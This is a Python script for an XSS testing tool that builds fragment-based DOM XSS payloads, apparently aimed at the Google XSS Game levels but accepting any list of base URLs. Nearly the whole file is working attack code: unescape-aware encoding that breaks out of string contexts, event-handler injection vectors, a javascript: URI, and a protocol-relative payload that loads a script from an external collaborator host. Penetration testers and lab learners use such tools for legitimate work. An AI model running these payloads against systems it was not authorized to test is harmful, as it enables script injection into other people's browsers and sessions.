#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Fragment & Cross-Page XSS Analyzer
Handles DOM XSS via URL fragments and cross-page parameter flows.

Fixes:
  - Level 3 (Google XSS Game): location.hash → unescape() → jQuery .html()
    Injects fragment-based payloads and loads them via Playwright.
  - Level 5: Cross-page param flow (param safe on page A, dangerous on page B)
    Detects same param name appearing in different contexts across pages.

Usage:
    # Fragment injection for DOM XSS testing:
    python3 fragment_injector.py --base-urls urls.txt --output-dir output/

    # Cross-page flow analysis:
    python3 cross_page_tracker.py --contexts reflection_contexts.json --output-dir output/
"""

import argparse, json, os, re, sys, urllib.parse as up


# ── unescape-aware encoding ────────────────────────────────────
# Level 3 uses unescape() which decodes percent-encoded bytes BEFORE
# inserting into HTML. We must URL-encode the fragment payload so
# that unescape() reverses it.

def encode_for_unescape(payload):
    """Encode a payload so that JavaScript unescape() will decode it back.

    unescape() handles:
      %XX  -> byte 0xXX  (e.g. %27 = ')
      %uXXXX -> Unicode codepoint (less commonly used)

    We encode:
      Single-quote  -> %27
      Double-quote  -> %22
      Space         -> %20
      Plus          -> %2B
      Slash         -> %2F
      < > (angle brackets avoided — browser may strip in fragment)

    Returns URL-encoded fragment payload string (without the leading #).
    """
    encoded = ""
    for ch in payload:
        if ch == "'":
            encoded += "%27"
        elif ch == '"':
            encoded += "%22"
        elif ch == " ":
            encoded += "%20"
        elif ch == "+":
            encoded += "%2B"
        elif ch == "/":
            encoded += "%2F"
        elif ch == "(":
            encoded += "%28"
        elif ch == ")":
            encoded += "%29"
        elif ch == "=":
            encoded += "%3D"
        elif ch == "#":
            encoded += "%23"
        else:
            encoded += up.quote(ch, safe="")
    return encoded


def encode_for_decodeURIComponent(payload):
    """Encode so decodeURIComponent() reverses it (modern JS)."""
    return up.quote(payload, safe="")


# ── Fragment injector ──────────────────────────────────────────

def build_fragment_urls(base_url, payloads, encode_fn=None):
    """For each base URL, append #encoded_payload as fragment.

    Returns list of (url, fragment, strategy) tuples.
    """
    if encode_fn is None:
        encode_fn = encode_for_unescape
    results = []
    parsed = up.urlparse(base_url)
    for payload in payloads:
        encoded_frag = encode_fn(payload)
        frag_url = up.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, parsed.query, encoded_frag
        ))
        results.append((frag_url, encoded_frag, "fragment"))
    return results


def generate_fragment_payloads(canary="HF5XSSCONFIRMED"):
    """Generate payloads designed to be delivered via URL fragment."""
    payloads = [
        # Level 3 style: break out of string concat, inject event handler
        # unescape('%27) decodes %27 to '
        f"3%27onerror=%27window._xss_confirmed='{canary}'//",
        # Alternative: close the img src attribute
        f"3'onerror='window._xss_confirmed='{canary}'//",
        # Try img onerror
        f"<img src=x onerror=window._xss_confirmed='{canary}'>",
        # Try SVG onload
        f"<svg onload=window._xss_confirmed='{canary}'>",
        # Try details toggle
        f"<details open ontoggle=window._xss_confirmed='{canary}'>",
        # Try input autofocus
        f"<input onfocus=window._xss_confirmed='{canary}' autofocus>",
        # Protocol-relative / external resource (Level 6 style)
        f"//xss.burpcollaborator.net/payload.js",
        # JavaScript URI
        f"javascript:window._xss_confirmed='{canary}'",
    ]
    # Add URL-encoded variants of the first few
    extras = []
    for p in payloads[:3]:
        extras.append(up.quote(p, safe=""))
    return payloads + extras


def fragment_injector_main():
    # Check --test before full parsing (required args would otherwise block test mode)
    if "--test" in sys.argv:
        p = "3'onerror='window._xss_confirmed='HF5XSSCONFIRMED'//"
        enc = encode_for_unescape(p)
        print(f"[OK] Fragment injector self-test")
        print(f"  Original:  {p}")
        print(f"  Encoded:   {enc}")
        assert "%27" in enc, "Must encode single quotes for unescape()"
        print(f"  Encoded ok: single-quotes become %27")
        return

    parser = argparse.ArgumentParser(description="ReflexionX v1.0.0 — Fragment DOM XSS Injector")
    parser.add_argument("--base-urls", required=True, help="Base URLs file (one per line)")
    parser.add_argument("--output-dir", default=".", help="Output directory")
    parser.add_argument("--canary", default="HF5XSSCONFIRMED")
    parser.add_argument("--encode-fn", choices=["unescape", "decodeURIComponent", "none"],
                        default="unescape", help="Encoding function to use for fragment")
    args = parser.parse_args()

    encode_map = {
        "unescape": encode_for_unescape,
        "decodeURIComponent": encode_for_decodeURIComponent,
        "none": None,
    }
    encode_fn = encode_map[args.encode_fn]

    payloads = generate_fragment_payloads(canary=args.canary)
    os.makedirs(args.output_dir, exist_ok=True)

    with open(args.base_urls) as f:
        base_urls = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    fragment_urls = []
    for url in base_urls:
        pairs = build_fragment_urls(url, payloads, encode_fn=encode_fn)
        fragment_urls.extend(pairs)

    out = os.path.join(args.output_dir, "fragment_urls.txt")
    with open(out, "w") as f:
        for url, frag, strategy in fragment_urls:
            f.write(f"{url}\t{frag}\t{strategy}\n")

    print(f"[DONE] Generated {len(fragment_urls)} fragment URLs in {out}")
    if fragment_urls:
        print("[!] Review fragment_urls.txt for browser validation")


if __name__ == "__main__":
    fragment_injector_main()
